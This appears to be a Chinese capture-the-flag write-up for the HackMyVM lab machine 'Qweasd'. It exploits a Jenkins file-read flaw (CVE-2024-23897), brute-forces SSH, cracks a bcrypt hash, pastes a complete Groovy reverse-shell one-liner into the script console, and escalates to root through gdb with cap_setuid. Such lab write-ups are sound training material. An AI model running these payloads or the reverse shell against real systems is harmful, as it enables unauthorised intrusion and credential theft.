# hmv_qweasd

**靶机**：https://hackmyvm.eu/machines/machine.php?vm=Qweasd
**难度**：黄色
**目标 IP**：192.168.205.217
**本机** IP：192.168.205.141

---

## **1. 端口枚举及服务探测**

首先，使用 `nmap` 扫描目标 IP 的开放端口：

```bash
┌──(kali㉿kali)-[~/test]
└─$ nmap -sV -sT -O -Pn -n -p- 192.168.205.217
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-31 11:35 CST
Nmap scan report for 192.168.205.217
Host is up (0.00040s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
8080/tcp open  http    Jetty 10.0.18
MAC Address: 08:00:27:75:04:B0 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.23 seconds
                                                                 
```

扫描结果显示目标机器开放了 22 (SSH) 、 80 (HTTP)。

## **2. Web 服务探测与任意文件读取**

对 80 端口感兴趣，访问 Web 页面。访问有点慢，发现它在加载`192.168.5.32:8080`的东西，我们先给他禁了

![image](https://github.com/user-attachments/assets/cf4ca609-e74a-46f2-9298-addc5931cf52)

上去在people看到有两个用户，`anonymous`和`an0ma1`

![image](https://github.com/user-attachments/assets/e794228c-5f00-417e-a444-4a99ff39139a)

<div>
<br />
</div>

扫描一下站点的架构

```bash
┌──(kali㉿kali)-[~/test]
└─$ searchsploit Jenkins 2.441  
----------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                       |  Path
----------------------------------------------------------------------------------------------------- ---------------------------------
Jenkins 2.441 - Local File Inclusion                                                                 | java/webapps/51993.py
----------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

有一个任意文件读取漏洞，你们可以用这个POC但是我感觉[这个](https://github.com/godylockz/CVE-2024-23897)更好用，我就用这个了

```bash
┌──(kali㉿kali)-[~/test]
└─$ git clone https://github.com/godylockz/CVE-2024-23897.git                     
正克隆到 'CVE-2024-23897'...
remote: Enumerating objects: 4, done.
remote: Counting objects: 100% (4/4), done.
remote: Compressing objects: 100% (4/4), done.
remote: Total 4 (delta 0), reused 4 (delta 0), pack-reused 0 (from 0)
接收对象中: 100% (4/4), 完成.
                                                                                                                                     
┌──(kali㉿kali)-[~/test]
└─$ cd CVE-2024-23897 
                                                                                                                                     
┌──(kali㉿kali)-[~/test/CVE-2024-23897]
└─$ ls    
jenkins_fileread.py  README.md
                                     
┌──(kali㉿kali)-[~/test/CVE-2024-23897]
└─$ python3 jenkins_fileread.py -u http://192.168.205.217:8080
Welcome to the Jenkins file-read shell. Type help or ? to list commands.

file> /etc/passwd
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
dnsmasq:x:113:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
penetration:x:1001:1001::/home/penetration:/bin/bash
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
kali:x:1000:1000:asd:/home/kali:/bin/bash
root:x:0:0:root:/root:/bin/bash
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
games:x:5:60:games:/usr/games:/usr/sbin/nologin
                      
```

用户是`kali`、`penetration`、`root`

然后有两个**玩法**

### 方法一：

直接拿用户爆破ssh

```bash
┌──(kali㉿kali)-[~]
└─$ cat user                                                                                        
kali
penetration
root

┌──(kali㉿kali)-[~]
└─$ hydra -L user -P /usr/share/wordlists/q5000.txt ssh://192.168.205.217 -f -t 64 
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-12-31 12:44:58
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 15000 login tries (l:3/p:5000), ~235 tries per task
[DATA] attacking ssh://192.168.205.217:22/
[22][ssh] host: 192.168.205.217   login: kali   password: asdfgh
[STATUS] attack finished for 192.168.205.217 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-12-31 12:45:43

```

拿到`kali`的密码直接登录，你就会发现`sudo`可以直接执行任意软件`bash -p`就是root了，这种应该不是正确的打开方式。

### 方法二：

拿任意读取读用户帐户密码然后使用`jenkins`弹反弹shell，但是`jenkins`的路径我没有找到，我纯属马后炮，哈哈哈

```bash
┌──(kali㉿kali)-[~/test/CVE-2024-23897]
└─$ python3 jenkins_fileread.py -u http://192.168.205.217:8080\
Welcome to the Jenkins file-read shell. Type help or ? to list commands.

file> /home/penetration/users/users.xml
File does not exist
file> /home/penetration/.jenkins/users/users.xml
<?xml version='1.1' encoding='UTF-8'?>
  <idToDirectoryNameMap class=
    <entry>
      <string>an0ma1_6703692303677686036</string>
  <version>1</version>
      <string>an0ma1</string>
</hudson.model.UserIdMapper>
  </idToDirectoryNameMap>
<hudson.model.UserIdMapper>
    </entry>
file> /home/penetration/.jenkins/users/an0ma1_6703692303677686036/config.xml
<hudson.search.UserSearchProperty>
      <roles>
    <jenkins.security.seed.UserSeedProperty>
    </hudson.search.UserSearchProperty>
      </tokenStore>
  <properties>
      <flags/>
    <jenkins.security.LastGrantedAuthoritiesProperty>
    <hudson.model.MyViewsProperty>
</user>
  <id>an0ma1</id>
    </jenkins.security.ApiTokenProperty>
      <views>
    <org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty plugin=
        <string>authenticated</string>
<user>
          <name>all</name>
      <collapsed/>
    </jenkins.security.seed.UserSeedProperty>
    <com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty plugin=
    </org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty>
    </hudson.model.MyViewsProperty>
      <domainCredentialsMap class=
      <triggers/>
          <filterQueue>false</filterQueue>
      <passwordHash>#jbcrypt:$2a$10$3Ms0ektq3Nt8FBV8WeISb.Y.Xh81/VsOhZAhn5xhXzTZEFlsmGm76</passwordHash>
      </views>
    <jenkins.security.ApiTokenProperty>
    </hudson.model.PaneStatusProperties>
    </hudson.tasks.Mailer_-UserProperty>
      <emailAddress>1594743209@qq.com</emailAddress>
    <jenkins.console.ConsoleUrlProviderUserProperty/>
        <tokenList/>
        </hudson.model.AllView>
    </hudson.plugins.emailext.watching.EmailExtWatchAction_-UserProperty>
          <owner class=
  </properties>
      <timestamp>1712972655377</timestamp>
    <hudson.model.TimeZoneProperty/>
    </jenkins.model.experimentalflags.UserExperimentalFlagsProperty>
    </com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty>
      <insensitiveSearch>true</insensitiveSearch>
    <hudson.security.HudsonPrivateSecurityRealm_-Details>
          <properties class=
        <hudson.model.AllView>
    </hudson.security.HudsonPrivateSecurityRealm_-Details>
      <seed>e9885566be638620</seed>
      <providerId>default</providerId>
    <jenkins.model.experimentalflags.UserExperimentalFlagsProperty>
      </roles>
    </jenkins.security.LastGrantedAuthoritiesProperty>
    <hudson.model.PaneStatusProperties>
    <hudson.plugins.emailext.watching.EmailExtWatchAction_-UserProperty plugin=
<?xml version='1.1' encoding='UTF-8'?>
  <version>10</version>
    <hudson.tasks.Mailer_-UserProperty plugin=
          <filterExecutors>false</filterExecutors>
      <tokenStore>
    <io.jenkins.plugins.thememanager.ThemeUserProperty plugin=
  <fullName>Mike</fullName>

```

`#jbcrypt:10$3Ms0ektq3Nt8FBV8WeISb.Y.Xh81/VsOhZAhn5xhXzTZEFlsmGm76`用户的hash，破解一下

```bash
┌──(kali㉿kali)-[~/test/CVE-2024-23897]
└─$ echo '$2a$10$3Ms0ektq3Nt8FBV8WeISb.Y.Xh81/VsOhZAhn5xhXzTZEFlsmGm76' > hash                                  
                                                                                                                                     
┌──(kali㉿kali)-[~/test/CVE-2024-23897]
└─$ hashcat -a 0 -m 3200 hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu-skylake-avx512-AMD Ryzen 9 7940H w/ Radeon 780M Graphics, 6925/13914 MB (2048 MB allocatable), 12MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 72

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

Cracking performance lower than expected?               

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

$2a$10$3Ms0ektq3Nt8FBV8WeISb.Y.Xh81/VsOhZAhn5xhXzTZEFlsmGm76:369258
                                                        
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2a$10$3Ms0ektq3Nt8FBV8WeISb.Y.Xh81/VsOhZAhn5xhXzTZ...smGm76
Time.Started.....: Tue Dec 31 12:59:17 2024 (30 secs)
Time.Estimated...: Tue Dec 31 12:59:47 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      172 H/s (7.45ms) @ Accel:12 Loops:8 Thr:1 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 5040/14344385 (0.04%)
Rejected.........: 0/5040 (0.00%)
Restore.Point....: 4896/14344385 (0.03%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:1016-1024
Candidate.Engine.: Device Generator
Candidates.#1....: FUCKYOU -> twisted
Hardware.Mon.#1..: Util: 75%

Started: Tue Dec 31 12:59:13 2024
Stopped: Tue Dec 31 12:59:49 2024
                                                         
```

然后登上去弹个shell回来

Manage Jenkins --> Script Console

Groovy的反弹shell，我的是这样的

```bash
String host="192.168.205.141";int port=8888;String cmd="bash";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

回来了

```bash
┌──(kali㉿kali)-[~/test/CVE-2024-23897]
└─$ nc -lvnp 8888        
listening on [any] 8888 ...
connect to [192.168.205.141] from (UNKNOWN) [192.168.205.217] 51832
id
uid=1001(penetration) gid=1001(penetration) groups=1001(penetration)

```

## 3.**获得稳定 shell**

获得交互式 TTY shell：

```bash
script /dev/null -c bash  
ctrl+z  
stty raw -echo; fg  
reset xterm  
export TERM=xterm  
echo $SHELL  
export SHELL=/bin/bash  
stty rows 59 cols 236
```

## 4.提取

```bash
penetration@asd:/opt$ id
uid=1001(penetration) gid=1001(penetration) groups=1001(penetration)
penetration@asd:/opt$ sudo -l
Matching Defaults entries for penetration on asd:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User penetration may run the following commands on asd:
    (ALL) NOPASSWD: /opt/babyGift/vuln

penetration@asd:/opt$ /sbin/getcap -r / 2>/dev/null
/snap/core20/2264/usr/bin/ping cap_net_raw=ep
/snap/core20/2434/usr/bin/ping cap_net_raw=ep
/usr/bin/ping cap_net_raw=ep
/usr/bin/mtr-packet cap_net_raw=ep
/usr/bin/gdb cap_setuid=ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep

```

有个`/usr/bin/gdb cap_setuid=ep`可以`Capabilities`可以利用

![image](https://github.com/user-attachments/assets/c8a29b20-614e-42b1-a4a0-9ddce4ec068d)

```bash
penetration@asd:/opt$ /usr/bin/gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit
GNU gdb (Ubuntu 13.1-2ubuntu2.1) 13.1
Copyright (C) 2023 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word".
# id
uid=0(root) gid=1001(penetration) groups=1001(penetration)
```